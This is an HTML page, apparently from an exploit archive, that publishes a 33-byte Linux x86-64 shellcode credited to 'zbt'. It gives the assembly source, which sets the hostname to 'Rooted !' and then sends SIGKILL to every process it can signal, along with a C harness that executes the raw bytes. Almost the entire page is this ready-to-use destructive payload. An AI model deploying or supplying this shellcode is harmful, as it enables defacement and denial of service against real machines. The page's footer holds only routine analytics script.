<html><head><title>Linux/x86-64 - sethostname() &amp; killall - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Linux/x86_64 sethostname() &amp; killall 33 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
 
 
/*
    ; sethostname(&quot;Rooted !&quot;);
    ; kill(-1, SIGKILL);
 
 
    section .text
        global _start
 
    _start:
 
        ;-- setHostName(&quot;Rooted !&quot;); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall
 
        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall
*/
int main(void)
{
    char shellcode[] =
    &quot;\xb0\xaa\x49\xb8\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x50\x48\x89&quot;
    &quot;\xe7\x40\xb6\x08\x0f\x05\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05&quot;;
 
    (*(void (*)()) shellcode)();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
